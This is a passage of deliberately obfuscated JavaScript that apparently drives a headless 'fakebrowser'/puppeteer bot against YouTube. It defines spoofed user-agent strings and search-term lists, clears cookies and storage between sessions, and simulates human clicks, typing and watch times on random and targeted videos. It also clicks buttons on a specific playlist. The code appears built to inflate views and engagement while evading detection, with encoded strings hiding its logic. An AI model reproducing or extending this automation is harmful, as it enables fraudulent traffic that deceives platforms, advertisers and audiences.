      'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
      'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
      'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
      'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
      'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
      'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
      'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
      'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
      'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
      'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
    ],
    'soundcloudTracks': [
      'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=fa2e1d6f9' + 'b4b4901969' + 'a02c82d453' + '4c4&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing',
      'https://so' + 'undcloud.c' + 'om/quadeca' + 'x8/house-s' + 'ettling-ft' + '-danny-bro' + 'wn?si=3527' + 'c3f6b1904b' + 'edac2d3673' + 'b266b9aa&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing',
      'https://so' + 'undcloud.c' + 'om/22down/' + Q(0xa) + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=2ec72b' + 'b6d77b4a08' + 'b2e8422f68' + '55699b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g',
      'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=357e' + '7dfc02cc4e' + 'a28b94c66a' + 'f7050293&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing',
      'https://so' + 'undcloud.c' + 'om/quadeca' + 'x8/sisyphu' + 's?si=2646e' + 'cb7ea704ba' + '68ea2711d1' + '659e92a&ut' + 'm_source=c' + 'lipboard&u' + 'tm_medium=' + 'text&utm_c' + 'ampaign=so' + 'cial_shari' + 'ng',
      'https://so' + 'undcloud.c' + 'om/quadeca' + 'x8/knots?s' + 'i=c127f344' + 'b3d34c9ca8' + 'e3d7cb4679' + '18f7&utm_s' + 'ource=clip' + 'board&utm_' + 'medium=tex' + 't&utm_camp' + 'aign=socia' + 'l_sharing',
      'https://so' + 'undcloud.c' + 'om/sadfros' + 'ty/beavis-' + 'butthead?s' + 'i=289d5c98' + 'ab0142b982' + '8ef6d51245' + 'b690&utm_s' + 'ource=clip' + 'board&utm_' + 'medium=tex' + 't&utm_camp' + 'aign=socia' + 'l_sharing',
      'https://so' + 'undcloud.c' + 'om/tyler-w' + 'allace-62/' + 'legacy-emi' + 'nem-remix-' + '1?si=8789c' + '4ffc202403' + 'bb58d7a49a' + '59ee589&ut' + 'm_source=c' + 'lipboard&u' + 'tm_medium=' + 'text&utm_c' + 'ampaign=so' + 'cial_shari' + 'ng'
    ],
    'oujsToAssist': [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    'oujsUAs': [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + P(0x0, '[)!t') + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ],
    'searchTerms': []
  };
data['searchTerm' + 's']['push']((O(0x14) + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), data['searchTerm' + 's']['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + Q(0x4) + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), data['searchTerm' + 's']['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), data['searchTerm' + 's']['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](-0x18a9 + 0x415 + -0xcb * -0x1a)), data['searchTerm' + 's']['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](-0x577 * 0x3 + -0x1 * -0xe27 + 0x248)), data['searchTerm' + 's']['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + Q(0x5) + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), data['searchTerm' + 's'] = data['searchTerm' + 's']['flat'](0x1ecf + 0xb3b + -0x2a07);
const HookManager = {
    'prototypes': () => {
      Array['prototype']['repeatExte' + 'nd'] = function(f) {
        let g = this,
          h = g;
        for (let i = 0x1961 + 0x8e9 + 0x1ce * -0x13; i < f; i++)
          h = h['concat'](g);
        return h;
      }, Array['prototype']['random'] = function() {
        return this[floor(random() * this['length'])];
      };
    }
  },
  arrs = new Map(),
  makeFetchCookie = require('fetch-cook' + 'ie');
HookManager['prototypes']();

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (-0x1076 + -0x1a5 * -0xc + 0x1a3 * -0x2);
    let h = e[f];
    if (b['CTCdty'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = -0x22ab * -0x1 + -0x252c + 0x281, s, t, u = -0x16 * -0x4f + 0x26ea + -0xd * 0x384; t = n['charAt'](u++); ~t && (s = r % (-0x5b + 0x3 * 0xa08 + 0x1 * -0x1db9) ? s * (0x12ee + -0x1 * -0x11dd + -0x248b) + t : t, r++ % (-0xd83 + 0x176e + -0x1fb * 0x5)) ? p += String['fromCharCode'](-0x15c5 * -0x1 + 0x2 * 0xae1 + -0x2a88 & s >> (-(0x5af * 0x4 + 0x1cc1 + 0x45 * -0xbf) * r & -0x261c + -0x1fd8 + 0x45fa)) : -0x307 + 0xd3 * -0x2b + 0x2678) {
          t = o['indexOf'](t);
        }
        for (let v = -0x25d8 + -0x1 * -0x3c + 0x259c, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](0x447 * -0x5 + -0x19de + 0x2f51))['slice'](-(0x1953 * -0x1 + 0x2148 + -0x7f3));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = 0x30f + 0x14d3 + -0x17e2,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0x37 * -0x1 + 0xb * 0x2f2 + -0x2ed * 0xb; u < 0x25 * 0x5d + -0x1d9d + -0x896 * -0x2; u++) {
          p[u] = u;
        }
        for (u = 0x5 * -0x512 + 0x1cc2 + -0x368; u < -0x222d + -0x1 * -0x1cca + 0x6d * 0xf; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (-0xcb8 + -0x22df * -0x1 + 0x39 * -0x5f), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = 0x10f1 * -0x1 + -0x2610 + 0x3701, q = -0x1e2b + -0x19 * -0xb8 + 0xc33;
        for (let v = -0x3e * 0x53 + -0x1 * 0xf3f + 0x2359; v < n['length']; v++) {
          u = (u + (-0xb * -0xe5 + 0x1d8f + -0x2765)) % (-0x11 * -0x18d + -0x1dae + 0x451), q = (q + p[u]) % (-0x11c4 + 0x1d27 + -0x1 * 0xa63), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (0xd5 * 0x2d + 0x1 * 0x1d2 + -0x2643)]);
        }
        return t;
      };
      b['hnlMVo'] = m, c = arguments, b['CTCdty'] = !![];
    }
    const j = e[-0x2da * -0xc + 0x28c * -0x4 + -0x4 * 0x602],
      k = f + j,
      l = c[k];
    return !l ? (b['vQQOwF'] === undefined && (b['vQQOwF'] = !![]), h = b['hnlMVo'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
const actions = [
  [
    () => flags['ActivateBr' + 'owser'],
    async () => {
      const U = b;
      async function f(z = '', A = 0x1 * 0x24f + -0x7ef * 0x3 + 0x1 * 0x157f, B) {
        const C = await B['waitForSel' + 'ector'](z);
        return await v['simClickEl' + 'ement'](C, {
          'pauseAfterMouseUp': A
        }), C;
      }
      async function g(z) {
        const A = await z['cookies']();
        for (const B of A)
          await z['deleteCook' + 'ie'](B);
        return await z['evaluate'](() => {
          window['name'] = '', localStorage['clear'](), sessionStorage['clear']();
        }), 0x2 * 0xc63 + -0x1b73 + 0x2ae;
      }
      async function h(z) {
        const R = c;
        let A = await u[R(0x11)]();
        return await A['setDefault' + 'Navigation' + 'Timeout'](-0x269b + 0x2269 + 0x432 * 0x1), await A['goto'](z, {
          'timeout': 0x0
        }), A;
      }
      async function i(z) {
        return await wait(-0x7 * -0x1fd + -0x16be + 0x7 * 0x40d), await z['waitForNet' + 'workIdle']({
          'idleTime': 0x1d4c,
          'timeout': 0x0
        }), -0x179b + 0x1c9 * 0xc + -0x28 * -0xe;
      }
      async function j(z) {
        log('watching..' + '.'), await z['evaluate'](() => {
          var B;
          (B = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](-0x30a + 0x6bc + -0x3b2, 0x29 * 0xb6 + 0x8b * 0x2e + 0xb * -0x4eb), B[Math['floor'](Math['random']() * B['length'])])['setAttribu' + 'te']('id', '__scope');
        }), await f('#__scope', -0x265f + 0x187e + 0xde1, z), await i(z);
        const A = await k(z);
        return await wait(min((-0x797e + -0x546d + 0x1b84b) * getRandomInt(0x1c2a + -0x1c41 + 0x5 * 0x5, -0xd * -0x2e3 + -0x10c8 + 0x2f6 * -0x7), A)), -0x232b + 0x6 * -0x595 + 0x44aa;
      }
      async function k(z) {
        return await z['evaluate'](() => {
          const A = {
            'Seconds': 0x3e8,
            'Minutes': 0xea60,
            'Hours': 0x36ee80,
            'Second': 0x3e8,
            'Minute': 0xea60,
            'Hour': 0x36ee80
          };
          let B = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
            C = -0x53 * 0x49 + 0x1bb2 + 0x1 * -0x407;
          B = B['split'](B['includes']('of') ? '\x20of\x20' : ',\x20')[-0x1acc + -0x1537 + 0x3004]['split']('\x20');
          for (let D = -0x1112 + 0x1605 + -0x7 * 0xb5; D < B['length']; D += -0x2643 + -0x9 * -0x43 + -0x2 * -0x11f5)
            C += B[D] * A[B[D + (0xc * -0x2f6 + 0x2 * -0x994 + -0x123b * -0x3)]];
          return C;
        });
      }
      async function l(z) {
        log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await z['goto'](channels['random'](), {
          'timeout': 0x0
        }), await f('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)', -0x1ebc + 0x265f + -0x55 * 0x17, z), log('clicked\x20vi' + 'deo\x20stuff'), await i(z), log('page\x20netwo' + 'rk\x20idle\x20x2'), await z['evaluate'](() => {
          const C = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](E => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == E['getAttribu' + 'te']('class'))['slice'](0xb28 + -0x1b * -0x9e + 0x4 * -0x6f3)['map'](E => Array['from'](E['children']))['flat'](-0x1cdd + -0x228c + 0x3f6a)['map'](E => E['childNodes'][-0xbd * -0x11 + 0x32 * 0x55 + 0xe * -0x215]['childNodes'][0x1 * -0xa9d + 0x101 * 0x16 + -0xb79]['childNodes'][0x1 * -0x20b9 + 0x3 * 0x1c0 + 0x1b7a]['childNodes'][-0x5c * 0x38 + 0x35f * -0x2 + -0xb5 * -0x26]['childNodes'][-0x18c5 + 0xf0e * -0x2 + 0x36e2]);
          var D;
          return (D = C)[Math['floor'](Math['random']() * D['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), C['map'](E => E['href']);
        }), await wait(getRandomInt(0xa00 + 0x1ca4 + 0x1a * -0x156, 0x61f * 0x4 + 0x1b33 + -0x2027)), await f('#__hookedV' + 'idToWatch', 0x9a5 + 0x1af8 + -0xc34 * 0x3, z), log('woah\x20click' + 'ed\x20some\x20vi' + 'deoo'), await wait(0x10ec + -0x350d + -0x3b * -0x19b);
        const A = await k(z),
          B = min((0x184f1 + -0x101 * 0x125 + 0x8b94) * getRandomInt(0x501 + 0x8aa + -0xda9, -0x72b + 0x226e + -0x1b3e), A);
        return log('Watching\x20v' + 'id\x20for\x20' + B + ('ms,\x20max\x20ti' + 'me:\x20') + A + 'ms'), await wait(B), -0x23bc + -0x8 * 0x16b + 0x2c5 * 0x11;
      }
      async function m(z) {
        return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await z['waitForSel' + 'ector']('.style-sco' + 'pe\x20ytd-ric' + 'h-grid-row'), await z['evaluate'](() => {
          var A;
          (A = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](B => 'contents' != B['id']), A[Math['floor'](Math['random']() * A['length'])])['children'][-0x9aa + -0x23b5 + 0x2d5f]['children'][0x23a0 + -0x44e * -0x5 + -0x3926]['children'][-0x1d42 + 0x26a9 * 0x1 + -0x967]['children'][-0x18 * 0x1a0 + 0x1151 + 0x15af]['children'][-0x1da1 * 0x1 + 0x648 + 0x1 * 0x1759]['setAttribu' + 'te']('id', 'gottemezez');
        }), await f('#gottemeze' + 'z', 0x426 + -0x141d + 0xff8, z), await i(z), await j(z), 0x8ca * 0x3 + -0x2 * 0x797 + -0x7 * 0x199;
      }
      async function n(z) {
        const S = b;
        log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await z['evaluate'](() => {
          let C = Array['from'](document['querySelec' + 'torAll']('#search'));
          document['getElement' + 'ById']('__searchBo' + 'xReal') || C['find'](D => 'INPUT' === D['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
        }), await f('#__searchB' + S(0x6, '#qO1'), -0xfd2 + -0x2b * -0x35 + -0xa1 * -0xb, z), await v['simKeyboar' + 'dType'](searchTerms['random']() + ''), await f('#search-ic' + 'on-legacy', 0xf0f + 0x5 * 0x3fd + 0x100 * -0x23, z), log('searching.' + '..'), await z['waitForFun' + 'ction']('Array.from' + '(document.' + 'getElement' + 'sByTagName' + '(\x22ytd-vide' + 'o-renderer' + '\x22)).length'), await i(z);
        let A = await z['evaluate'](() => {
          const T = d,
            C = {
              'seconds': 0x3e8,
              'minutes': 0xea60,
              'hours': 0x36ee80,
              'second': 0x3e8,
              'minute': 0xea60,
              'hour': 0x36ee80
            },
            D = (E = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + T(0xf)))['map'](G => G['childNodes'][-0x191 * 0x4 + 0x3b9 * 0x1 + 0x28d]['childNodes'][0x1 * -0xd72 + 0x167f * -0x1 + 0x23f2]['childNodes'][-0xf55 + 0x7e * 0x22 + -0x166]))[Math['floor'](Math['random']() * E['length'])];
          var E;
          const F = D['childNodes'][-0x1895 + 0x176f + -0xd * -0x17]['childNodes'][-0x9a7 + -0x294 + 0xc3b]['childNodes'][0x5d * 0x5a + -0x4f7 + -0x1 * 0x1bb9]['ariaLabel'];
          return D['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'),
            function(G) {
              let H = G['split'](',\x20')['map'](J => J['split']('\x20'))['flat'](0xd9f + 0x1 * -0x2228 + 0x148a),
                I = 0x23fa + 0x25b5 + -0x49af;
              for (let J = 0x267b + 0x5 * -0x279 + 0x2 * -0xd0f; J < H['length']; J += 0x1 * 0x2372 + 0x8bc + -0x1616 * 0x2)
                I += H[J] * C[H[J + (0x3e * -0x19 + 0x1925 * 0x1 + 0xe * -0x15d)]];
              return I;
            }(F);
        });
        await f('#__hookedV' + 'idToClick', 0x1ed4 + 0xb * 0xc + -0x1f58, z);
        let B = min((0x1c59e * -0x1 + 0x89 * 0x19 + -0x1 * -0x2a29d) * getRandomInt(-0x1d08 + 0x1320 + 0x2b * 0x3b, -0x5fa + -0x2 * -0xe99 + -0x172e), A + (-0x5 * -0x218 + -0xc25 * 0x1 + -0x59 * -0x3d));
        return log('watching\x20v' + 'ideo\x20for\x20' + B + 'ms'), await wait(B), 0x4ec * -0x3 + -0xcb1 * 0x1 + 0x1b76;
      }
      async function o(z) {
        await z['goto']('https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + x['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y')), await f('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill', 0x6 * -0x43 + -0x4f * -0x6a + -0x1f23, z), await f('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill', 0x29c * -0x2 + -0x4 * 0x4ab + 0x17e5, z);
        const A = setInterval(async () => {
          log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await z['evaluate'](() => {
            setTimeout(() => {
              document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on') ? .['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
            }, 0x1 * 0x7bd + 0x15 * -0xd0 + -0x150b * -0x1 + (-0xa6d + -0x124 + -0xf79 * -0x1) * Math['random']());
          });
        }, -0x1376 + -0x86b * 0x1 + 0x43 * 0xd3);
        await wait(-0x1d * -0x2802 + -0x79443 + -0x9 * -0xd8e1);
        try {
          z['$']('#__lllll') && await f('#__lllll', 0x16a + -0x16ab + 0x1542, z);
        } catch (B) {}
        return await wait((0x63ac * -0x1 + -0xa297 * 0x2 + -0x6 * -0x6ddf) * getRandomInt(-0x1 * -0x23cd + -0x77 * 0x10 + -0x1c59, -0x1429 + 0x10 * -0x16f + -0x6 * -0x733)), clearInterval(A), 0x1e94 * 0x1 + -0x5c0 + -0x18d3;
      }
      log('index.js\x20c' + 'alled');
      const {
        FakeBrowser: p
      } = require('fakebrowse' + 'r'), q = require('path'), r = q['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), s = new p['Builder']()['displayUse' + 'rActionLay' + 'er'](0x4df * -0x8 + 0xb * 0x282 + -0x1 * -0xb62)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([
        require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
          'blockTrackers': 0x1,
